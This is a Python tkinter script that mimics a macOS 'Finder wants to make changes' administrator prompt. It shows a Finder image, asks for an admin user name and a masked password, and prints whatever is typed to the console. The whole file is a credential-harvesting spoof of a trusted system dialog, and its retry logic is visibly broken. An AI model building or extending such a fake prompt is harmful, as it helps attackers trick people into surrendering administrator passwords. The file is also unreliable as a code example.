
#for 3.6.4
from tkinter import *
import tkinter as tk
import os

class Window(Frame):
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.master = master
        master.resizable(0,0)
        master.pack_propagate(0)
        master.geometry("500x200")
        self.grid()
        self.widgets()
        self.entry()
        self.master.title("Finder wants to make changes.")
        self.finderImg()

#Widgets and Entries
    def finderImg(self):
        #Image doesnt want to fucking show up.
        canvas = Canvas(self, width = 100, height = 93)
        canvas.grid(row=2, column=1, rowspan=2)

        img = PhotoImage(file="./Images/finder.gif")
        canvas.create_image(50, 50, image=img)
        canvas.image = img

    def widgets(self):
        okayButton = Button(self, text="Okay", command=self.okay)
        okayButton.grid(row=7, column=4)

        cancelButton = Button(self, text="Cancel", command=self.exitButton)
        cancelButton.grid(row=7, column=3)

    def entry(self):
        titleLabel = Label(self, text="Finder wants to make changes.")
        titleLabel.grid(row=1, column=2, columnspan=2, sticky=W)

        head = Label(self, text="Enter an administrator's name and password to allow this.")
        head.grid(row=2, column=2, columnspan=2)

        L1 = Label(self, text="User Name: ")
        L1.grid(row=3, column=2, sticky=E)
        self.username = tk.Entry(self)
        self.username.grid(row=3, column=3)
        self.username.bind('<Return>', self.okay)

        L2 = Label(self, text="Password: ")
        L2.grid(row=4, column=2, sticky=E)
        bullet = "\u2022"
        self.password = tk.Entry(self)
        self.password.grid(row=4, column=3)
        self.password.config(show=bullet)
        self.password.bind('<Return>', self.okay)

#Button functions (works, but not with <Return> bind)
# tries idea not trashed, work on later
    def okay(self):
        self.tryLoop()
        user = self.username.get()
        password = self.password.get()
        if user == "" or password == "":
            print("No username or password entered.")
        else:
            print("User Name: " + user)
            print("Password: " + password)

    def exitButton(self):
        print("~Exiting~")
        exit()

#the "incorrect password" loop
    def tryLoop(self):
        tries = 0
        if tries == 3:
            exitButton()
        else:
            tries = tries + 1
            return tries
            print("~Input number " + str(tries) + "~")

#Starts the program
def start():
    os.system("cls")
    print("~Waiting for input~")
    master = Tk()
    app = Window(master)
    master.mainloop()

start()
